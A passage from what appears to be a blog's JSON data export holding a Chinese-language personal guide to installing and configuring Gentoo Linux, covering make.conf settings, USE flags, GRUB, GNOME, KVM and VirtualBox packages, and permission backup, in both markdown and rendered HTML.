GRUB\nGRUB_PLATFORMS=\"efi-64\"\n\n# CPUS\nABI_X86=\"64\"\nCPU_FLAGS_X86=\"aes avx avx2 f16c fma3 mmx mmxext pclmul popcnt rdrand sha sse sse2 sse3 sse4_1 sse4_2 sse4a ssse3\"\n\n# cards\nVIDEO_CARDS=\"amdgpu radeonsi\"\n\n# touchpad\n#INPUT_DEVICES=\"libinput synaptics\"  ##设置后触摸板配置失效\n\n# language\nL10N=\"en-US zh-CN en zh\"\nLINGUAS=\"en-US zh-CN en zh\"\n\n# USE\n\nSYSME=\"-test -doc systemd\"\nGNOME=\"-kde -games -help -extras X gtk gnome\"\nUSE=\"${SYSME} ${GNOME} \"\n```\n\n## 3.2 USE\n\n个人 `USE` 使用说明：\n- `/etc/portage/make.conf` 仅添加必要 `flag` 且尽量仅添加排除项。\n```bash\nSYSME=\"-test -doc systemd\"\nGNOME=\"-kde -games -help -extras X gtk gnome\"\nUSE=\"${SYSME} ${GNOME} \"\n```\n- `/etc/portage/package.accept_keywords` 文件夹中创建文件，添加需要开启 `~amd`(测试) 属性的包\n```bash\napp-office/wps-office ~*\n```\n-  `/etc/portage/package.use` 文件夹中创建文件，添加与 `/etc/portage/make.conf` 中 `USE` 相悖或者仅对该包生效的 `flag`\n```bash\napp-emulation/qemu spice QEMU_SOFTMMU_TARGETS: x86_64 QEMU_USER_TARGETS: x86_64\nnet-dns/dnsmasq script\nnet-misc/spice-gtk usbredir\n```\n\n# 4 tools\n\n## 4.1 包管理\n\n### 4.1.1 app-portage/eix\n\n```bash\napp-portage/eix\napp-portage/gentoolkit\napp-portage/layman\n```\n\n## 4.2 文件系统\n\n### 4.2.1 sys-fs/lvm2\n\n```bash\nsys-fs/lvm2\n```\n\n### 4.2.2 ntfs\n\n```bash\nsys-fs/ntfs3g\n```\n\n## 4.3 DE\n\n### 4.3.1 gnome \n\n> 一定要有swap分区，否则编译不会通过  \n> make。conf 中 MAKEOPTS=\"-j4\" 此条不存在编译也会失败\n\n```bash\ngnome-base/gnome\ngnome-base/gconf\ngnome-extra/gnome-tweaks\n```\n\n## 4.4 vitual\n\n### 4.4.1 virtualbox\n\n```bash\napp-emulation/virtualbox\napp-emulation/virtualbox-additions\napp-emulation/virtualbox-extpack-oracle\napp-emulation/virtualbox-modules\napp-emulation/virtualbox-guest-additions  # gentoo虚拟机安装\n```\n\n### 4.4.2 kvm\n\n```bash\napp-emulation/qemu\napp-emulation/libvirt\napp-emulation/virt-manager\nnet-misc/bridge-utils\n```\n\n```bash\nusermod -a -G libvirt miloo\nusermod -a -G kvm miloo \nsystemctl enable libvirtd\nsystemctl enable virtlogd-admin.socket\n```\n\n\n# 5 系统迁移\n\n## 5.1 权限备份与恢复\n\n```bash\ngetfacl -R ./ > acl.txt\nsetfacl --restore=acl.txt\n```\n\n## 5.2 用户组\n\n```\n用户id=1001(miloo) 组id=100(users) 组=100(users),10(wheel),11(floppy),18(audio),19(cdrom),27(video),85(usb),78(kvm),272(plugdev),172(pulse-access),304(vboxusers),79(libvirt)\n```\n","slug":"2022-07-04.gentoo配置手册","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"cl6nug9b00007oqnadpxef0d7","content":"<ul>\n<li><a href=\"#1-%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\">1 准备工作</a><ul>\n<li><a href=\"#11-%E4%B8%8B%E8%BD%BD\">1.1 下载</a></li>\n<li><a href=\"#12-%E7%BD%91%E7%BB%9C\">1.2 网络</a></li>\n<li><a href=\"#13-%E5%88%86%E5%8C%BA%E6%8C%82%E8%BD%BD\">1.3 分区挂载</a></li>\n<li><a href=\"#14-ssh%E8%BF%9E%E6%8E%A5%E6%9C%80%E5%B0%8F%E5%8C%96%E5%AE%89%E8%A3%85%E7%B3%BB%E7%BB%9F\">1.4 ssh连接最小化安装系统</a></li>\n</ul>\n</li>\n<li><a href=\"#2-%E5%AE%89%E8%A3%85\">2 安装</a><ul>\n<li><a href=\"#21-%E8%A7%A3%E5%8E%8B%E5%9F%BA%E6%9C%AC%E7%B3%BB%E7%BB%9F\">2.1 解压基本系统</a></li>\n<li><a href=\"#22-%E9%95%9C%E5%83%8F%E6%BA%90%E4%B8%8Echroot\">2.2 镜像源与chroot</a></li>\n<li><a href=\"#23-portage%E4%BB%93%E5%BA%93\">2.3 portage仓库</a></li>\n<li><a href=\"#24-profile%E9%80%89%E6%8B%A9\">2.4 profile选择</a></li>\n<li><a href=\"#25-%E5%AE%89%E8%A3%85%E5%86%85%E6%A0%B8%E5%9B%BA%E4%BB%B6\">2.5 安装内核、固件</a></li>\n<li><a href=\"#26-%E9%85%8D%E7%BD%AE%E5%BC%95%E5%AF%BC\">2.6 配置引导</a></li>\n<li><a href=\"#27-%E6%97%B6%E5%8C%BA%E5%AD%97%E7%AC%A6%E9%9B%86%E9%85%8D%E7%BD%AE\">2.7 时区、字符集配置</a></li>\n<li><a href=\"#28-virtualbox-%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE\">2.8 virtualbox 虚拟机配置</a></li>\n</ul>\n</li>\n<li><a href=\"#3-use\">3 USE</a><ul>\n<li><a href=\"#31-makeconf\">3.1 make.conf</a></li>\n<li><a href=\"#32-use\">3.2 USE</a></li>\n</ul>\n</li>\n<li><a href=\"#4-tools\">4 tools</a><ul>\n<li><a href=\"#41-%E5%8C%85%E7%AE%A1%E7%90%86\">4.1 包管理</a><ul>\n<li><a href=\"#411-app-portageeix\">4.1.1 app-portage&#x2F;eix</a></li>\n</ul>\n</li>\n<li><a href=\"#42-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F\">4.2 文件系统</a><ul>\n<li><a href=\"#421-sys-fslvm2\">4.2.1 sys-fs&#x2F;lvm2</a></li>\n<li><a href=\"#422-ntfs\">4.2.2 ntfs</a></li>\n</ul>\n</li>\n<li><a href=\"#43-de\">4.3 DE</a><ul>\n<li><a href=\"#431-gnome\">4.3.1 gnome</a></li>\n</ul>\n</li>\n<li><a href=\"#44-vitual\">4.4 vitual</a><ul>\n<li><a href=\"#441-virtualbox\">4.4.1 virtualbox</a></li>\n<li><a href=\"#442-kvm\">4.4.2 kvm</a></li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#5-%E7%B3%BB%E7%BB%9F%E8%BF%81%E7%A7%BB\">5 系统迁移</a><ul>\n<li><a href=\"#51-%E6%9D%83%E9%99%90%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D\">5.1 权限备份与恢复</a></li>\n<li><a href=\"#52-%E7%94%A8%E6%88%B7%E7%BB%84\">5.2 用户组</a></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"1-准备工作\"><a href=\"#1-准备工作\" class=\"headerlink\" title=\"1 准备工作\"></a>1 准备工作</h1><h2 id=\"1-1-下载\"><a href=\"#1-1-下载\" class=\"headerlink\" title=\"1.1 下载\"></a>1.1 下载</h2><ul>\n<li><p>下载<a href=\"https://mirrors.bfsu.edu.cn/gentoo/releases/amd64/autobuilds/current-install-amd64-minimal/\">最小化安装镜像</a>, 名称为: <code>install-amd64-minimal-&#123;日期&#125;.iso</code>  </p>\n</li>\n<li><p>下载<a href=\"https://mirrors.bfsu.edu.cn/gentoo/releases/amd64/autobuilds/\">合适的stage3</a>,以日期为路径: <code>20220703T170542Z/stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz</code></p>\n</li>\n</ul>\n<h2 id=\"1-2-网络\"><a href=\"#1-2-网络\" class=\"headerlink\" title=\"1.2 网络\"></a>1.2 网络</h2><p>&amp;emsp;&amp;emsp;基操忽略</p>\n<h2 id=\"1-3-分区挂载\"><a href=\"#1-3-分区挂载\" class=\"headerlink\" title=\"1.3 分区挂载\"></a>1.3 分区挂载</h2><p>&amp;emsp;&amp;emsp;基操忽略</p>\n<h2 id=\"1-4-ssh连接最小化安装系统\"><a href=\"#1-4-ssh连接最小化安装系统\" class=\"headerlink\" title=\"1.4 ssh连接最小化安装系统\"></a>1.4 ssh连接最小化安装系统</h2><p>&amp;emsp;&amp;emsp;编辑 <code>sshd</code> 服务配置文件 <code>/etc/ssh/sshd_config</code>, 重启服务 <code>rc-server sshd restart</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">PermitRootLogin <span class=\"hljs-built_in\">yes</span><br>PasswordAuthentication <span class=\"hljs-built_in\">yes</span><br></code></pre></td></tr></table></figure>\n<h1 id=\"2-安装\"><a href=\"#2-安装\" class=\"headerlink\" title=\"2 安装\"></a>2 安装</h1><h2 id=\"2-1-解压基本系统\"><a href=\"#2-1-解压基本系统\" class=\"headerlink\" title=\"2.1 解压基本系统\"></a>2.1 解压基本系统</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">livecd ~ <span class=\"hljs-comment\"># blkid</span><br>/dev/sdb: UUID=<span class=\"hljs-string\">&quot;e09609d8-0b90-4f34-aad1-8e5b37495f52&quot;</span> BLOCK_SIZE=<span class=\"hljs-string\">&quot;4096&quot;</span> TYPE=<span class=\"hljs-string\">&quot;ext4&quot;</span><br>/dev/sr0: BLOCK_SIZE=<span class=\"hljs-string\">&quot;2048&quot;</span> UUID=<span class=\"hljs-string\">&quot;2022-07-03-19-01-40-00&quot;</span> LABEL=<span class=\"hljs-string\">&quot;Gentoo amd64 20220703T170542Z&quot;</span> TYPE=<span class=\"hljs-string\">&quot;iso9660&quot;</span> PTUUID=<span class=\"hljs-string\">&quot;5e426e6b&quot;</span> PTTYPE=<span class=\"hljs-string\">&quot;dos&quot;</span><br>loop0: TYPE=<span class=\"hljs-string\">&quot;squashfs&quot;</span><br>/dev/sda2: UUID=<span class=\"hljs-string\">&quot;14077ead-3683-4354-95eb-a106c52350e9&quot;</span> BLOCK_SIZE=<span class=\"hljs-string\">&quot;4096&quot;</span> TYPE=<span class=\"hljs-string\">&quot;ext4&quot;</span> PARTUUID=<span class=\"hljs-string\">&quot;4af31142-0ead-0644-b34c-c01b7c0944e1&quot;</span><br>/dev/sda1: UUID=<span class=\"hljs-string\">&quot;831A-6EDD&quot;</span> BLOCK_SIZE=<span class=\"hljs-string\">&quot;512&quot;</span> TYPE=<span class=\"hljs-string\">&quot;vfat&quot;</span> PARTUUID=<span class=\"hljs-string\">&quot;733a54ad-b3d7-3842-8cc8-21b15d29e82d&quot;</span><br>livecd ~ <span class=\"hljs-comment\"># mount /dev/sda2 /mnt/gentoo/</span><br>livecd ~ <span class=\"hljs-comment\"># mkdir /mnt/gentoo/boot</span><br>livecd ~ <span class=\"hljs-comment\"># mount /dev/sda1 /mnt/gentoo/boot</span><br>livecd ~ <span class=\"hljs-comment\"># cd /mnt/gentoo/</span><br>livecd /mnt/gentoo <span class=\"hljs-comment\"># ls</span><br>boot  lost+found<br>livecd /mnt/gentoo <span class=\"hljs-comment\"># wget https://mirrors.bfsu.edu.cn/gentoo/releases/amd64/autobuilds/20220703T170542Z/stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz</span><br>--2022-07-05 08:09:54--  https://mirrors.bfsu.edu.cn/gentoo/releases/amd64/autobuilds/20220703T170542Z/stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz  <br>Resolving mirrors.bfsu.edu.cn... 39.155.141.16, 2001:da8:20f:1003::fe55:2840<br>Connecting to mirrors.bfsu.edu.cn|39.155.141.16|:443... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 516402028 (492M) [application/octet-stream]<br>Saving to: ‘stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz’<br>stage3-amd64-desktop-systemd- 100%[=================================================&gt;] 492.48M  11.3MB/s    <span class=\"hljs-keyword\">in</span> 46s<br>2022-07-05 08:10:40 (10.6 MB/s) - ‘stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz’ saved [516402028/516402028]<br>livecd /mnt/gentoo <span class=\"hljs-comment\"># tar xpvf stage3-amd64-desktop-systemd-20220703T170542Z.tar.xz --xattrs-include=&#x27;*.*&#x27; --numeric-owner</span><br>……<br></code></pre></td></tr></table></figure>\n<h2 id=\"2-2-镜像源与chroot\"><a href=\"#2-2-镜像源与chroot\" class=\"headerlink\" title=\"2.2 镜像源与chroot\"></a>2.2 镜像源与chroot</h2><p>&amp;emsp;&amp;emsp;配置一个速度较快的镜像源服务器地址</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">mirrorselect -i -o &gt;&gt;/mnt/gentoo/etc/portage/make.conf  <span class=\"hljs-comment\"># 选择163和清华大学源</span><br><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&#x27;GENTOO_MIRRORS=&quot;https://mirrors.tuna.tsinghua.edu.cn/gentoo&quot;&#x27;</span> &gt;&gt;/mnt/gentoo/etc/portage/make.conf<br><span class=\"hljs-comment\"># chroot 到目标系统</span><br><span class=\"hljs-comment\"># 复制 DNS 配置到目标系统环境</span><br><span class=\"hljs-built_in\">cp</span> -L /etc/resolv.conf /mnt/gentoo/etc/<br><span class=\"hljs-comment\"># 挂载必要的文件系统</span><br>mount --types proc /proc /mnt/gentoo/proc<br>mount --rbind /sys /mnt/gentoo/sys<br>mount --rbind /dev /mnt/gentoo/dev<br><span class=\"hljs-comment\"># systemd stage3 额外执行</span><br>mount --make-rslave /mnt/gentoo/sys<br>mount --make-rslave /mnt/gentoo/dev<br><span class=\"hljs-comment\"># chroot 到目标系统环境</span><br><span class=\"hljs-built_in\">chroot</span> /mnt/gentoo<br><span class=\"hljs-comment\"># 导入环境信息</span><br>. /etc/profile<br><span class=\"hljs-comment\"># 修改提示符以便于区分</span><br>PS1=(<span class=\"hljs-built_in\">chroot</span>)<span class=\"hljs-variable\">$PS1</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-3-portage仓库\"><a href=\"#2-3-portage仓库\" class=\"headerlink\" title=\"2.3 portage仓库\"></a>2.3 portage仓库</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 仓库信息打包下载到本地</span><br>emerge-webrsync<br><span class=\"hljs-comment\"># 安装 vim</span><br>emerge -ask app-editors/vim<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-4-profile选择\"><a href=\"#2-4-profile选择\" class=\"headerlink\" title=\"2.4 profile选择\"></a>2.4 profile选择</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">(<span class=\"hljs-built_in\">chroot</span>)livecd / <span class=\"hljs-comment\"># eselect profile list</span><br>(<span class=\"hljs-built_in\">chroot</span>)livecd / <span class=\"hljs-comment\"># eselect profile set 7</span><br>(<span class=\"hljs-built_in\">chroot</span>)livecd / <span class=\"hljs-comment\"># emerge --ask --verbose --update --deep --newuse @world</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-5-安装内核、固件\"><a href=\"#2-5-安装内核、固件\" class=\"headerlink\" title=\"2.5 安装内核、固件\"></a>2.5 安装内核、固件</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">(<span class=\"hljs-built_in\">chroot</span>)livecd / <span class=\"hljs-comment\"># emerge --ask gentoo-kernel  </span><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">(<span class=\"hljs-built_in\">chroot</span>)livecd / <span class=\"hljs-comment\"># emerge --ask linux-firmware</span><br><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-6-配置引导\"><a href=\"#2-6-配置引导\" class=\"headerlink\" title=\"2.6 配置引导\"></a>2.6 配置引导</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">(<span class=\"hljs-built_in\">chroot</span>)livecd / <span class=\"hljs-comment\"># emerge --ask grub</span><br>(<span class=\"hljs-built_in\">chroot</span>)livecd / <span class=\"hljs-comment\"># grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=Gentoo</span><br>Installing <span class=\"hljs-keyword\">for</span> x86_64-efi platform.<br>Installation finished. No error reported.<br>(<span class=\"hljs-built_in\">chroot</span>)livecd / <span class=\"hljs-comment\"># grub-install --target=x86_64-efi --efi-directory=/boot --removable</span><br>Installing <span class=\"hljs-keyword\">for</span> x86_64-efi platform.<br>Installation finished. No error reported.  <br>(<span class=\"hljs-built_in\">chroot</span>)livecd / <span class=\"hljs-comment\"># grub-mkconfig -o /boot/grub/grub.cfg</span><br>Generating grub configuration file ...<br>Found linux image: /boot/vmlinuz-5.15.48-gentoo-dist<br>Found initrd image: /boot/initramfs-5.15.48-gentoo-dist.img<br>Warning: os-prober will not be executed to detect other bootable partitions.<br>Systems on them will not be added to the GRUB boot configuration.<br>Check GRUB_DISABLE_OS_PROBER documentation entry.<br>Adding boot menu entry <span class=\"hljs-keyword\">for</span> UEFI Firmware Settings ...<br><span class=\"hljs-keyword\">done</span>        <br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-7-时区、字符集配置\"><a href=\"#2-7-时区、字符集配置\" class=\"headerlink\" title=\"2.7 时区、字符集配置\"></a>2.7 时区、字符集配置</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&#x27;Asia/Shanghai&#x27;</span> &gt; /etc/timezone<br><span class=\"hljs-built_in\">rm</span> /etc/localtime<br>emerge --config sys-libs/timezone-data<br>vim /etc/locale.gen<br>locale-gen<br><br><span class=\"hljs-built_in\">dd</span> <span class=\"hljs-keyword\">if</span>=/dev/zero of=/swapfile bs=1M count=8192 status=progress<br><span class=\"hljs-built_in\">chmod</span> 600 /swapfile<br>mkswap /swapfile<br>swapon /swapfile<br><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;/swapfile               none    swap    defaults        0 0&quot;</span> &gt;&gt; /etc/fstab<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-8-virtualbox-虚拟机配置\"><a href=\"#2-8-virtualbox-虚拟机配置\" class=\"headerlink\" title=\"2.8 virtualbox 虚拟机配置\"></a>2.8 virtualbox 虚拟机配置</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 新建用户</span><br>useradd -m -g wheel -G usb,<span class=\"hljs-built_in\">users</span>,audio -s /bin/bash -N miloo<br><br><span class=\"hljs-comment\"># 如果是虚拟机需要添加到以下两个组</span><br>gpasswd -a miloo vboxguest<br>gpasswd -a miloo vboxsf<br><br><span class=\"hljs-comment\"># virtualbox 虚拟机安装后操作</span><br>emerge --ask app-emulation/virtualbox-guest-additions<br>systemctl <span class=\"hljs-built_in\">enable</span> --now virtualbox-guest-additions<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"3-USE\"><a href=\"#3-USE\" class=\"headerlink\" title=\"3 USE\"></a>3 USE</h1><h2 id=\"3-1-make-conf\"><a href=\"#3-1-make-conf\" class=\"headerlink\" title=\"3.1 make.conf\"></a>3.1 make.conf</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># These settings were set by the catalyst build script that automatically</span><br><span class=\"hljs-comment\"># built this stage.</span><br><span class=\"hljs-comment\"># Please consult /usr/share/portage/config/make.conf.example for a more</span><br><span class=\"hljs-comment\"># detailed example.</span><br>COMMON_FLAGS=<span class=\"hljs-string\">&quot;-march=native -O2 -pipe&quot;</span><br>CFLAGS=<span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$&#123;COMMON_FLAGS&#125;</span>&quot;</span><br>CXXFLAGS=<span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$&#123;COMMON_FLAGS&#125;</span>&quot;</span><br>FCFLAGS=<span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$&#123;COMMON_FLAGS&#125;</span>&quot;</span><br>FFLAGS=<span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$&#123;COMMON_FLAGS&#125;</span>&quot;</span><br>MAKEOPTS=<span class=\"hljs-string\">&quot;-j25&quot;</span><br><br><span class=\"hljs-comment\"># <span class=\"hljs-doctag\">NOTE:</span> This stage was built with the bindist Use flag enabled</span><br>PORTDIR=<span class=\"hljs-string\">&quot;/var/db/repos/gentoo&quot;</span><br>DISTDIR=<span class=\"hljs-string\">&quot;/var/cache/distfiles&quot;</span><br>PKGDIR=<span class=\"hljs-string\">&quot;/var/cache/binpkgs&quot;</span><br><br><span class=\"hljs-comment\"># This sets the language of build output to English.</span><br><span class=\"hljs-comment\"># Please keep this setting intact when reporting bugs.</span><br>LC_MESSAGES=C<br><br><span class=\"hljs-comment\"># mirrors</span><br>GENTOO_MIRRORS=<span class=\"hljs-string\">&quot;https://mirrors.ustc.edu.cn/gentoo/&quot;</span><br>ACCEPT_LICENSE=<span class=\"hljs-string\">&quot;*&quot;</span><br>ACCEPT_KEYWORDS=<span class=\"hljs-string\">&quot;amd64&quot;</span><br>AUTO_CLEAN=<span class=\"hljs-string\">&quot;yes&quot;</span><br><br><span class=\"hljs-comment\"># aria</span><br>FETCHCOMMAND=<span class=\"hljs-string\">&quot;/usr/bin/aria2c -d \\$&#123;DISTDIR&#125; -o \\$&#123;FILE&#125; --allow-overwrite=true --max-tries=5 --max-file-not-found=2 --max-concurrent-downloads=5 --connect-timeout=5 --timeout=5 --split=5 --min-split-size=2M --lowest-speed-limit=20K --max-connection-per-server=9 --uri-selector=feedback \\$&#123;URI&#125;&quot;</span><br>RESUMECOMMAND=<span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$&#123;FETCHCOMMAND&#125;</span>&quot;</span><br><br><span class=\"hljs-comment\"># ccache</span><br>FEATURES=<span class=\"hljs-string\">&quot;ccache -test&quot;</span><br>CCACHE_DIR=<span class=\"hljs-string\">&quot;/var/cache/ccache&quot;</span><br><br><span class=\"hljs-comment\"># GRUB</span><br>GRUB_PLATFORMS=<span class=\"hljs-string\">&quot;efi-64&quot;</span><br><br><span class=\"hljs-comment\"># CPUS</span><br>ABI_X86=<span class=\"hljs-string\">&quot;64&quot;</span><br>CPU_FLAGS_X86=<span class=\"hljs-string\">&quot;aes avx avx2 f16c fma3 mmx mmxext pclmul popcnt rdrand sha sse sse2 sse3 sse4_1 sse4_2 sse4a ssse3&quot;</span><br><br><span class=\"hljs-comment\"># cards</span><br>VIDEO_CARDS=<span class=\"hljs-string\">&quot;amdgpu radeonsi&quot;</span><br><br><span class=\"hljs-comment\"># touchpad</span><br><span class=\"hljs-comment\">#INPUT_DEVICES=&quot;libinput synaptics&quot;  ##设置后触摸板配置失效</span><br><br><span class=\"hljs-comment\"># language</span><br>L10N=<span class=\"hljs-string\">&quot;en-US zh-CN en zh&quot;</span><br>LINGUAS=<span class=\"hljs-string\">&quot;en-US zh-CN en zh&quot;</span><br><br><span class=\"hljs-comment\"># USE</span><br><br>SYSME=<span class=\"hljs-string\">&quot;-test -doc systemd&quot;</span><br>GNOME=<span class=\"hljs-string\">&quot;-kde -games -help -extras X gtk gnome&quot;</span><br>USE=<span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$&#123;SYSME&#125;</span> <span class=\"hljs-variable\">$&#123;GNOME&#125;</span> &quot;</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"3-2-USE\"><a href=\"#3-2-USE\" class=\"headerlink\" title=\"3.2 USE\"></a>3.2 USE</h2><p>个人 <code>USE</code> 使用说明：</p>\n<ul>\n<li><code>/etc/portage/make.conf</code> 仅添加必要 <code>flag</code> 且尽量仅添加排除项。<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">SYSME=<span class=\"hljs-string\">&quot;-test -doc systemd&quot;</span><br>GNOME=<span class=\"hljs-string\">&quot;-kde -games -help -extras X gtk gnome&quot;</span><br>USE=<span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$&#123;SYSME&#125;</span> <span class=\"hljs-variable\">$&#123;GNOME&#125;</span> &quot;</span><br></code></pre></td></tr></table></figure></li>\n<li><code>/etc/portage/package.accept_keywords</code> 文件夹中创建文件，添加需要开启 <code>~amd</code>(测试) 属性的包<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">app-office/wps-office ~*<br></code></pre></td></tr></table></figure></li>\n<li><code>/etc/portage/package.use</code> 文件夹中创建文件，添加与 <code>/etc/portage/make.conf</code> 中 <code>USE</code> 相悖或者仅对该包生效的 <code>flag</code><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">app-emulation/qemu spice QEMU_SOFTMMU_TARGETS: x86_64 QEMU_USER_TARGETS: x86_64<br>net-dns/dnsmasq script<br>net-misc/spice-gtk usbredir<br></code></pre></td></tr></table></figure></li>\n</ul>\n<h1 id=\"4-tools\"><a href=\"#4-tools\" class=\"headerlink\" title=\"4 tools\"></a>4 tools</h1><h2 